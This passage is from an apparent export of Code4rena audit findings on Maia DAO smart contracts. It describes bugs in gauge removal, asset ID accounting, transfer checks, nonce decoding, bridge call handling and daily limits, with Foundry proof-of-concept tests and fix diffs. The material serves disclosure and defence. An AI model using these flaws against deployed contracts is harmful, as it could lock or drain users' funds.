https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L340-L348 https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L465-L473 https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L475-L519 https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L125-L137   # Vulnerability details  ## Impact  Gauge factories have a [`BaseV2GaugeFactory::removeGauge`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L130-L137) that removes the indicate gauge and marks it as deprecated for the corresponding [`bHermesGauges` and `bHermesBoost`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeManager.sol#L100-L103) token contracts.  However, removing a `UniswapV3Gauge` with `UniswapV3GaugeFactory` does not actually remove it from the `UniswapV3Staker`; Gauge still remains and existing users that staked still gain the exact same benefits from it. What is worse that staking to the gauge can still happen and any new users that stakes cannot receive a share of the generated fees (plus boost), as it is impossible to vote for the deprecated gauge.  ### Issue detailed explanation  When a `UniswapV3Gauge` is created via `UniswapV3GaugeFactory` it is also attached to a `UniswapV3Staker` via the [`BaseV2GaugeFactory::afterCreateGauge`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L122-L125) callback [implementation](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/UniswapV3GaugeFactory.sol#L87-L91):  ```Solidity     /// @notice Adds Gauge to UniswapV3Staker     /// @dev Updates the UniswapV3 staker with bribe and minimum width information     function afterCreateGauge(address strategy, bytes memory) internal override {         uniswapV3Staker.updateGauges(IUniswapV3Pool(strategy));     } ```  However there is no `afterCreateRemoved` mechanism implemented in `BaseV2GaugeFactory`, as such, the `UniswapV3Staker` contract is never updated about the removed gauge. This creates a situation in which existing users/stakes benefit while new stakes lose out on bribes, gaming the system.  This is because:   - new users can stake to the deprecated gauge, as there is no mechanism to check if the gauge they are staking to is active or not (similar to how [`UniswapV3Staker::updateGauges` checks](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/uni-v3-staker/UniswapV3Staker.sol#L526-L529))  ```Solidity     function updateGauges(IUniswapV3Pool uniswapV3Pool) external {         address uniswapV3Gauge = address(uniswapV3GaugeFactory.strategyGauges(address(uniswapV3Pool)));           if (uniswapV3Gauge == address(0)) revert InvalidGauge(); ```  - **but** new users that stake to the deprecated gauge do not receive a portion of fees that are generated and sent to the bribe deposit. Although users that have staked to the _now_ deprecated gauge **beforehand** still gain the fees generated by the staked positions.   This happens because when gauge removal happened in [BaseV2GaugeManager::removeGauge](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeManager.sol#L100-L103) the indicated gauge is marked as deprecated ([bHermesGauges::ERC20Gauges::_removeGauge](https://github.com/code-423n4/2023-05-maia/blob/main/src/erc-20/ERC20Gauges.sol#L435). Users that have already voted to the deprecated gauge still get the bribe rewards when `BaseV2Gauge::accrueBribes` is called.   Rewards flows is:  - [BaseV2Gauge::accrueBribes](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/BaseV2Gauge.sol#L111-L121)     - [FlywheelCore::accrue](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/base/FlywheelCore.sol#L69-L72)         - [FlywheelCore::_accrue](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/base/FlywheelCore.sol#L74-L81)             - [FlywheelCore::accrueUser](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/base/FlywheelCore.sol#L196-L198) (influences reward calculation)                 - [FlywheelBoosterGaugeWeight::boostedBalanceOf](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/booster/FlywheelBoosterGaugeWeight.sol#L58-L61)                     - [bHermesGauges::ERC20Gauges::getUserGaugeWeight](https://github.com/code-423n4/2023-05-maia/blob/main/src/erc-20/interfaces/IERC20Gauges.sol#L62-L65)                         - and `ERC20Gauges::getUserGaugeWeight` is only [increasable if the gauge is not deprecated](https://github.com/code-423n4/2023-05-maia/blob/main/src/erc-20/ERC20Gauges.sol#L203)   To be noted that the action of _unstaking_ (calling [UniswapV3Staker::_unstakeToken](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L377-L390)) sends rewards to the gauge bribe deposit: ```Solidity             // scope for bribeAddress, avoids stack too deep errors             address bribeAddress = bribeDepots[key.pool];               if (bribeAddress != address(0)) {                 nonfungiblePositionManager.collect(                     INonfungiblePositionManager.CollectParams({                         tokenId: tokenId,                         recipient: bribeAddress,                         amount0Max: type(uint128).max,                         amount1Max: type(uint128).max                     })                 );             }         } ```  from where it is then transferred to those that already delegated to the (now deprecated) gauge following the already mentioned execution flow.   Note, deprecated gauges [still have the boosting bonus associated with `bHermesBoost`](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L401-L424) where the same issue as above appears, already existing users get the boost, new users cannot.   ```Solidity         // ...                  // get boost amount and total supply         (boostAmount, boostTotalSupply) = hermesGaugeBoost.getUserGaugeBoost(owner, address(gauge));                  // ...          secondsInsideX128 = RewardMath.computeBoostedSecondsInsideX128(             // ...             uint128(boostAmount),             uint128(boostTotalSupply),             // ...          );          // ...          uint256 reward = RewardMath.computeBoostedRewardAmount(             // ...             secondsInsideX128,             // ...         );          } ```  ## Proof of Concept  A step by step execution flow was shown above in **Issue detailed explanation**  Lack of active gauge check can be observed in any of the staking flow functions: - [restakeToken](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L340-L348) - [stakeToken](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L465-L473) - [_stakeToken](https://github.com/code-423n4/2023-05-maia/blob/main/src/uni-v3-staker/UniswapV3Staker.sol#L475-L519) (called by the above 2)  Also no [`BaseV2GaugeFactory::afterCreateRemoved`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L125-L137) type callback existing  A theoretical POC would by as: - a `UniswapV3Gauge` is created via `UniswapV3GaugeFactory` (it is also automatically attached to the existing `UniswapV3Staker`) - users vote for it via `bHermesGauges` - team decides to remove the existing `UniswapV3Gauge` for a newer version - team calls `BaseV2GaugeFactory::removeGauge` that does not remove the gauge from the `UniswapV3Staker` while also deprecating it in `bHermesGauges` - the now deprecated and faulty removed `UniswapV3Gauge` still receives fees from the `UniswapV3Staker` - new users stake to the removed `UniswapV3Gauge` but will not receive any bribe rewards creating a situation where the first depositors gain the later ones  ## Tools Used  Manual analysis and, **the most important factor**: a very good, active and helping project team!  ## Recommended Mitigation Steps  As the system is complex we must take into consideration a few observations:  - we cannot remove the gauge from `UniswapV3Staker` because already existing incentives would become bricked and worthless - removing a gauge completely from the `UniswapV3Staker` means loosing potential rewards deposited by users     - a `UniswapV3Staker` without the `bHermesGauges` mechanism is similar to a normal `UniswapV3Staker` so it does still work has some incentive - leaving the gauge open to be staked and added incentives would allow old stakers to pray on new stakes and new stakers will not receive any fees generated by the staked positions - refunding potential emissions (rewards) deposited by users (or protocols) adds storage overhead - a `BaseV2GaugeFactory::afterCreateRemoved` mechanism is required regardless for any future gauge that needs post remove operations - deprecated gauges still have the boosting bonus associated with `bHermesBoost` where the same issue as above appears, already existing users get the boost, new users cannot  A possible solution can be a mix of the above: 1. create a `BaseV2GaugeFactory::afterCreateRemoved` mechanism 2. add a function `UniswapV3GaugeFactory::afterCreateRemoved` that overrides the above that calls `UniswapV3Staker::updateBribeDepot` 3. in `UniswapV3Staker::updateBribeDepot` check if the strategy associated with the `IUniswapV3Pool` is active and if not, then set the bribeDepot (`bribeDepots[uniswapV3Pool]`) of that pool's gauge to the zero address so that no new rewards are sent to the deprecated gauge  The above is a minimum suggested regardless. Extra:  3. add a check for  `UniswapV3Staker::_stakeToken` if the gauge is active or not and revert; i.e. do not allow any further staking into inactive gauges 4. Consider decreasing the gain value of `bHermesBoost` if the gauge is deprecated in `_unstakeToken`. Some more consideration should be taken if implementing this as any reward bonuses that were not collected before the removal/deprecation will also be lost (that in itself is an issue that must not happen).   ## Assessed type  Other"}, {"title": "`UlyssesToken` asset ID accounting error", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/275", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-25"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L72   # Vulnerability details  ## Impact Asset IDs in the `UlyssesToken` contract are **1-based**, see [L49 in UlyssesToken.addAsset(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L49) and [L55 in ERC4626MultiToken.constructor(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/ERC4626MultiToken.sol#L55) of the parent contract.   However, when removing an asset from the `UlyssesToken` contract, the last added asset gets the **0-based** ID of the removed asset, see [L72 in UlyssesToken.removeAsset(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L72).    This leads to the following consequences: 1. Duplicate IDs when removing an asset.   Example: We have assets with IDs `1,2,3,4`. Next, asset with ID=2 is removed. Now we have assets with IDs `1,1,3` because the last asset with ID=4 gets ID=2-1=1. 2. Last asset cannot be removed after removing first asset.   Example: Once the first asset with ID=1 is removed, the last asset gets ID=0 instead of ID=1. When trying to remove the last asset [L62 in UlyssesToken.removeAsset(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L62) will **revert** due to underflow. 3. Last asset can be added a second time after removing first asset.   Example: Once the first asset with ID=1 is removed, the last asset gets ID=0 instead of ID=1. When trying to add the last asset again [L45 in UlyssesToken.addAsset(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L45) will **not revert** since ID=0 indicates that the asset wasn't added yet. Therefore, the underlying vault can contain the same token twice with **different** weights.  In conclusion, the asset accounting of the `UlyssesToken` contract is broken after removing an asset (especially the first one). This was also highlighted as a special area of concern in the audit details: `ulysses AMM and token accounting`  ## Proof of Concept  The above issues are demostrated by the new test cases `test_UlyssesTokenAddAssetTwice` and `test_UlyssesTokenRemoveAssetFail`, just apply the *diff* below and run the tests with `forge test --match-test test_UlyssesToken`. ```diff diff --git a/test/ulysses-amm/UlyssesTokenTest.t.sol b/test/ulysses-amm/UlyssesTokenTest.t.sol index bdb4a7d..dcf6d45 100644 --- a/test/ulysses-amm/UlyssesTokenTest.t.sol +++ b/test/ulysses-amm/UlyssesTokenTest.t.sol @@ -3,6 +3,7 @@ pragma solidity >=0.8.0 <0.9.0;   import {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\";  import {UlyssesToken} from \"@ulysses-amm/UlyssesToken.sol\"; +import {IUlyssesToken} from \"@ulysses-amm/interfaces/IUlyssesToken.sol\";   import {UlyssesTokenHandler} from \"@test/test-utils/invariant/handlers/UlyssesTokenHandler.t.sol\";  @@ -29,4 +30,28 @@ contract InvariantUlyssesToken is UlyssesTokenHandler {          _vaultMayBeEmpty = true;          _unlimitedAmount = false;      } + +    function test_UlyssesTokenRemoveAssetFail() public  { +        UlyssesToken token = UlyssesToken(_vault_); + +        // remove first asset with ID=1 +        token.removeAsset(_underlyings_[0]); +        // due to accounting error, last asset now has ID=0 instead of ID=1 + +        // remove last asset --> underflow error due to ID=0 +        token.removeAsset(_underlyings_[NUM_ASSETS - 1]); +    } + +    function test_UlyssesTokenAddAssetTwice() public  { +        UlyssesToken token = UlyssesToken(_vault_); + +        // remove first asset with ID=1 +        token.removeAsset(_underlyings_[0]); +        // due to accounting error, last asset now has ID=0 instead of ID=1 + +        // add last asset again --> doesn't revert since it \"officially\" doesn't exist due to ID=1 +        vm.expectRevert(IUlyssesToken.AssetAlreadyAdded.selector); +        token.addAsset(_underlyings_[NUM_ASSETS - 1], 1); +    } +  }  ```  We can see that adding the last asset again does **not revert** but trying to remove it still **fails**: ``` Encountered 2 failing tests in test/ulysses-amm/UlyssesTokenTest.t.sol:InvariantUlyssesToken [FAIL. Reason: Call did not revert as expected] test_UlyssesTokenAddAssetTwice() (gas: 169088) [FAIL. Reason: Arithmetic over/underflow] test_UlyssesTokenRemoveAssetFail() (gas: 137184) ```  ## Tools Used VS Code, Foundry, MS Excel  ## Recommended Mitigation Steps  Fortunately, all of the above issues can be easily fixed by using an **1-based** asset ID in [L72 of UlyssesToken.removeAsset(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L72): ```diff diff --git a/src/ulysses-amm/UlyssesToken.sol b/src/ulysses-amm/UlyssesToken.sol index 552a125..0937e9f 100644 --- a/src/ulysses-amm/UlyssesToken.sol +++ b/src/ulysses-amm/UlyssesToken.sol @@ -69,7 +69,7 @@ contract UlyssesToken is ERC4626MultiToken, Ownable, IUlyssesToken {           address lastAsset = assets[newAssetsLength];  -        assetId[lastAsset] = assetIndex; +        assetId[lastAsset] = assetIndex + 1;          assets[assetIndex] = lastAsset;          weights[assetIndex] = weights[newAssetsLength];  ```  After applying the recommended fix, both new test cases pass: ``` [PASS] test_UlyssesTokenAddAssetTwice() (gas: 122911) [PASS] test_UlyssesTokenRemoveAssetFail() (gas: 134916) ```    ## Assessed type  Under/Overflow"}, {"title": "ERC4626PartnerManager.checkTransfer does not check ``amount`` correctly as it applies bHermesRate to balanceOf[from] but not ``amount``. ", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/268", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-36"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L325-L335   # Vulnerability details  ## Impact Detailed description of the impact of this finding. ERC4626PartnerManager.checkTransfer() does not check ``amount`` correctly as it applies bHermesRate to balanceOf[from] but not to ``amount``.   ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  ``ERC4626PartnerManager.checkTransfer()`` is a modifier that will be called to ensure that the ``from`` account has sufficient funding to cover  ``userClaimedWeight[from]``, ``userClaimedBoost[from]``, ``userClaimedGovernance[from]``, and ``userClaimedPartnerGovernance[from]`` before transfer occurs:  [https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L325-L335](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L325-L335)  However, ``bHermesRate`` is applied to ``balanceOf[from]`` but not to ``amount``. This is not right, since ``amount`` is not in the units of ``userClaimedWeight[from]``, ``userClaimedBoost[from]``, ``userClaimedGovernance[from]``, and ``userClaimedPartnerGovernance[from]``, but in the units of shares of ERC4626PartnerManager.    The correct way to check would be to ensure  ``balanceOf[from]-amount *  bHermesRate`` >= ``userClaimedWeight[from]``, ``userClaimedBoost[from]``, ``userClaimedGovernance[from]``, and ``userClaimedPartnerGovernance[from]``.    ## Tools Used VSCode  ## Recommended Mitigation Steps  ```diff  modifier checkTransfer(address from, uint256 amount) virtual { -        uint256 userBalance = balanceOf[from] * bHermesRate; +        uint256 userBalance = (balanceOf[from] - amount) * bHermesRate;  -        if ( -            userBalance - userClaimedWeight[from] < amount || userBalance - userClaimedBoost[from] < amount -                || userBalance - userClaimedGovernance[from] < amount -                || userBalance - userClaimedPartnerGovernance[from] < amount -        ) revert InsufficientUnderlying();  +        if ( +            userBalance < userClaimedWeight[from] || userBalance < userClaimedBoost[from]  +                || userBalance < userClaimedGovernance[from]  || userBalance <  userClaimedPartnerGovernance[from]  +        ) revert InsufficientUnderlying();           _;     } ```      ## Assessed type  Math"}, {"title": "Accessing the incorrect offset to get the nonce when flag is 0x06 in RootBridgeAgent::anyExecute() will lead to mark as executed incorrect nonces and could potentially cause a DoS", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/267", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-26"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1083-L1116   # Vulnerability details  ## Impact - Not reading the correct offset where the `nonce` is located can lead to set as executed the incorrect nonce, which will cause unexpected behavior and potentially a DoS when attempting to execute a `nonce` that incorrectly was marked as already executed.  ## Proof of Concept - The structure of the [data is encoded as detailed in the `IRootBridgeAgent` contract](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/interfaces/IRootBridgeAgent.sol#L144) ```solidity  *          |            Flag               |        Deposit Info        |             Token Info             |   DATA   |  Gas Info   |  *          |           1 byte              |         4-25 bytes         |     3 + (105 or 128) * n bytes     |   ---  |  32 bytes   |  *          |_______________________________|____________________________|____________________________________|__________|_____________|   *          | callOutSignedMultiple = 0x6   |   20b + 1b(n) + 4b(nonce)  |      32b + 32b + 32b + 32b + 3b    |   ---  |  16b + 16b  | ```  - The actual encoding of the data happens on the `BranchBridgeAgent` contract, [on these lines](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L288-L301)  - Based on the data structure we can decode and determine on what offset is located what data   - `data[0]`       => flag   - `data[1:21]`    => an address   - `data[21]`      => hTokens.length   - `data[22:26]`   => The 4 bytes of the nonce  - So, when flag is `0x06`, the nonce is located at the offset `data[22:26]`, that indicates that the current offset that is been accessed is wrong [(`data[PARAMS_START_SIGNED:25]` === `data[21:]`)](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1083-L1085)  ## Tools Used Manual Audit  ## Recommended Mitigation Steps - Make sure to read the `nonce` from the correct offset, based on the [data structure as explain in the `IRootBridgeAgent` contract]()  - For `flag 0x06`, read the offset as follows, either of the two options are correct:   - **`nonce` is located at: `data[22:26]`** ```solidity nonce = uint32(bytes4(data[PARAMS_START_SIGNED + PARAMS_START : 26])); nonce = uint32(bytes4(data[22:26])); ```      ## Assessed type  en/de-code"}, {"title": "Lack of return value handing in `ArbitrumBranchBridgeAgent._performCall()` could cause users' deposit to be locked in contract", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/266", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-27"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L143   # Vulnerability details  In `ArbitrumBranchBridgeAgent`, the `_performCall()` is overridden to directly call `RootBridgeAgent.anyExecute()` instead of performing an AnyCall cross-chain transaction as `RootBridgeAgent` is also in Arbitrum. However, unlike AnyCall, `ArbitrumBranchBridgeAgent._performCall()` is missing the handling of return value for `anyExecute()`.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/ArbitrumBranchBridgeAgent.sol#L143 ```Solidity  function _performCall(bytes memory _callData) internal override {         IRootBridgeAgent(rootBridgeAgentAddress).anyExecute(_callData);     } ```  That is undesirable as `RootBridgeAgent.anyExecute()` has a try/catch that prevents revert from bubbling up. Instead, it expects `ArbitrumBranchBridgeAgent._performCall()` to revert when `success == false`, which is currently missing.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1068-L1074 ```Solidity             try RootBridgeAgentExecutor(bridgeAgentExecutorAddress).executeSignedWithDeposit(                 address(userAccount), localRouterAddress, data, fromChainId             ) returns (bool, bytes memory res) {                 (success, result) = (true, res);             } catch (bytes memory reason) {                 result = reason;             } ```  ## Impact   Without handling the scenario when `RootBridgeAgent.anyExecute()` returns false, `ArbitrumBranchBridgeAgent._performCall()` will continue execution even for failed calls and not revert due to the try/catch in `RootBridgeAgent.anyExecute()`.  In the worst case, users could lose their bridged deposit when they use `ArbitrumBranchBridgeAgent.callOutSignedAndBridge()` to interact with dApps and encountered failed calls.   When failed calls to dApps occur, `ArbitrumBranchBridgeAgent.callOutSignedAndBridge()` is expected to revert the entire transaction and reverse the bridging of deposit. However, due to the issue with `_performCall()`, the bridged deposit will not be reverted, thus locking up users' fund in the contract. Furthermore, `RootBridgeAgent.anyExecute()` will mark the deposit transaction as executed in `executionHistory[]`, preventing any `retryDeposit()` or `retrieveDeposit()` attempts to recover the funds. ## Proof of Concept  Add the following MockContract and test case to ArbitrumBranchTest.t.sol and run the test case.  ```Solidity     contract MockContract is Test {         function test() external {             require(false);         }     }       function testPeakboltArbCallOutWithDeposit() public {         //Set up         testAddLocalTokenArbitrum();          // deploy mock contract to call using multicall         MockContract mockContract = new MockContract();          //Prepare data         address outputToken;         uint256 amountOut;         uint256 depositOut;         bytes memory packedData;          {             outputToken = newArbitrumAssetGlobalAddress;             amountOut = 100 ether;             depositOut = 50 ether;              Multicall2.Call[] memory calls = new Multicall2.Call[](1);              //prepare for a call to MockContract.test(), which will revert             calls[0] = Multicall2.Call({target: address(mockContract), callData: abi.encodeWithSignature(\"test()\")});                  //Output Params             OutputParams memory outputParams = OutputParams(address(this), outputToken, amountOut, depositOut);              //toChain             uint24 toChain = rootChainId;              //RLP Encode Calldata             bytes memory data = abi.encode(calls, outputParams, toChain);              //Pack FuncId             packedData = abi.encodePacked(bytes1(0x02), data);         }          //Get some gas.         hevm.deal(address(this), 1 ether);          //Mint Underlying Token.         arbitrumNativeToken.mint(address(this), 100 ether);          //Approve spend by router         arbitrumNativeToken.approve(address(localPortAddress), 100 ether);          //Prepare deposit info         DepositInput memory depositInput = DepositInput({             hToken: address(newArbitrumAssetGlobalAddress),             token: address(arbitrumNativeToken),             amount: 100 ether,             deposit: 100 ether,             toChain: rootChainId         });          //Mock messaging layer fees         hevm.mockCall(             address(localAnyCongfig),             abi.encodeWithSignature(\"calcSrcFees(address,uint256,uint256)\", address(0), 0, 100),             abi.encode(0)         );          console2.log(\"Initial User Balance: %d\", arbitrumNativeToken.balanceOf(address(this)));          //Call Deposit function         arbitrumMulticallBridgeAgent.callOutSignedAndBridge{value: 1 ether}(packedData, depositInput, 0.5 ether);          // This shows that deposit entry is successfully created         testCreateDepositSingle(             arbitrumMulticallBridgeAgent,             uint32(1),             address(this),             address(newArbitrumAssetGlobalAddress),             address(arbitrumNativeToken),             100 ether,             100 ether,             1 ether,             0.5 ether         );          // The following shows that user deposited to the LocalPort, but it is not deposited/bridged to the user account         console2.log(\"LocalPort Balance (expected):\", uint256(50 ether));         console2.log(\"LocalPort Balance (actual):\", MockERC20(arbitrumNativeToken).balanceOf(address(localPortAddress)));         //require(MockERC20(arbitrumNativeToken).balanceOf(address(localPortAddress)) == 50 ether, \"LocalPort should have 50 tokens\");          console2.log(\"User Balance: (expected)\", uint256(50 ether));         console2.log(\"User Balance: (actual)\", MockERC20(arbitrumNativeToken).balanceOf(address(this)));         //require(MockERC20(arbitrumNativeToken).balanceOf(address(this)) == 50 ether, \"User should have 50 tokens\");          console2.log(\"User Global Balance: (expected)\", uint256(50 ether));         console2.log(\"User Global Balance: (actual)\", MockERC20(newArbitrumAssetGlobalAddress).balanceOf(address(this)));         //require(MockERC20(newArbitrumAssetGlobalAddress).balanceOf(address(this)) == 50 ether, \"User should have 50 global tokens\");          // retryDeposit() will fail as well as the the transaction is marked executed in executionHistory         uint32 depositNonce = arbitrumMulticallBridgeAgent.depositNonce() - 1;         hevm.deal(address(this), 1 ether);         //hevm.expectRevert(abi.encodeWithSignature(\"GasErrorOrRepeatedTx()\"));         arbitrumMulticallBridgeAgent.retryDeposit{value: 1 ether}(true, depositNonce, \"\", 0.5 ether, rootChainId);      } ```   ## Recommended Mitigation Steps Handle the return value of `anyExecute()` in `_performCall()` and revert on `success == false`.   ## Assessed type  Other"}, {"title": "Branch Strategies lose yield due to wrong implementation of time limit in BranchPort.sol", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/264", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-37"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L193-L199   # Vulnerability details  ## Impact Branch Strategies lose yield due to a wrong implementation of the time limit in BranchPort.sol. This results in missed yield for branch strategies, less capital utilization of the platform, and ultimately a loss of additional revenue for the protocol's users.  ## Proof of Concept  The `_checkTimeLimit` function in `BranchPort.sol` controls whether amounts used by a branch strategy do cumulatively not exceed the daily limit which is set for the particular strategy. It is only called from the `manage` function in the same contract (https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L161).  The current implementation of `_checkTimeLimit` looks like this:  ```Solidity function _checkTimeLimit(address _token, uint256 _amount) internal {     if (block.timestamp - lastManaged[msg.sender][_token] >= 1 days) {         strategyDailyLimitRemaining[msg.sender][_token] = strategyDailyLimitAmount[msg.sender][_token];     }     strategyDailyLimitRemaining[msg.sender][_token] -= _amount;     lastManaged[msg.sender][_token] = block.timestamp; } ```  **I.) The current implementation does the following**  1. The first time a strategy manages some amount and `_checkTimeLimit` is called the 24h window is started (strategyDailyLimitRemaining[msg.sender][_token] is initialized to the daily limit amount and lastManaged[msg.sender][_token] is set to block.timestamp)  2. On a second call to use more of the daily limit (if the amount used in 1. is not the full daily amount, which is not enforced), it will set lastManaged[msg.sender][_token] again to block.timestamp. This pushes the time when the daily budget will be reset (strategyDailyLimitRemaining[msg.sender][_token] = strategyDailyLimitAmount[msg.sender][_token]) again 24 hours into the future.  **Consequences of the current implementation**  - Due to the setting of the lastManaged[msg.sender][_token] on every call the daily budget misses its purpose as a budget reset after 24h is not guaranteed.  - In the worst but likely case, a call is made by the strategy just before the current 24h time window passes to use the remaining amount. This will delay a reset of the daily limit by the maximum possible time. In consequence, a strategy misses 1 full amount of the daily budget.  - The aforementioned results in a loss of yield for the strategy (assuming the strategy generates a yield), less capital utilization of the platform, and ultimately a loss of additional revenue for the protocol's users.  - Assuming there are multiple strategies in the protocol, the negative effect is multiplied.  **II.) The implementation that was probably intended**  ```Solidity function _checkTimeLimit(address _token, uint256 _amount) internal {     if (block.timestamp - lastManaged[msg.sender][_token] >= 1 days) {         strategyDailyLimitRemaining[msg.sender][_token] = strategyDailyLimitAmount[msg.sender][_token];         lastManaged[msg.sender][_token] = block.timestamp; // <--- line moved here     }     strategyDailyLimitRemaining[msg.sender][_token] -= _amount; } ```  - Here the reset of the daily budget is made after a 24h time window as expected.  - What is lost, is the information \"when the last time a strategy called the function\" as lastManaged[msg.sender][_token] now only stores the block timestamp the last time the daily budget was reset and not when the last time the function was called. If this should still be tracked consider an additional state variable (e.g. lastDailyBudgetReset[msg.sender][_token]).  ## Tools Used Manual review  ## Recommended Mitigation Steps  Implement the logic as shown under \"II.) The implementation that was probably intended\".  Please also, consider the following comments:  - To get the maximum amount out of their daily budget a strategy must make a call to the `manage()` function exactly every 24h hours after the first time calling it. Otherwise, there are time frames where amounts could be retrieved but are not. That would have the strategy missing out on investments and therefore potential yield. E.g. 2nd call happens 36h (instead of 24h) after the initial call => 12 hours (1/2 of a daily budget) remains unused.  - The amount also needs to be fully used within the 24h timeframe since the daily limit is overwriting and not cumulating (using strategyDailyLimitRemaining[msg.sender][_token] = strategyDailyLimitAmount[msg.sender][_token] and not strategyDailyLimitRemaining[msg.sender][_token] += strategyDailyLimitAmount[msg.sender][_token])  - An alternative to the aforementioned could be to calculate the amount to grant to a strategy after an initial/last grant like the following: (time since last grant of fresh daily limit / 24h) * daily limit. This would have the effect that a strategy could use their granted limits without missing amounts due to suboptimal timing. It would also spare the strategy the necessary call every 24h which would save some gas and remove the need for setting up automation for each strategy (e.g. using Chainlink keepers). The strategy could never spend more than the cumulative daily budgets. But it may lead to  sudden usage of a large amount of accumulated budget which may not be intended.   ## Assessed type  Timing"}, {"title": "DoS of RootBridgeAgent due to missing negation of return values for UniswapV3Pool.swap()", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/262", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-38"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L684 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L728 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L884-L886 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L757-L767   # Vulnerability details  Both `RootBridgeAgent._gasSwapIn()` and `RootBridgeAgent._gasSwapOut()` do not negate the negative returned value of UniswapV3Pool.swap() before casting to `uint256`. That will cause the parent functions `anyExecute()` and `_manageGasOut()` to revert on overflow when casting return values of 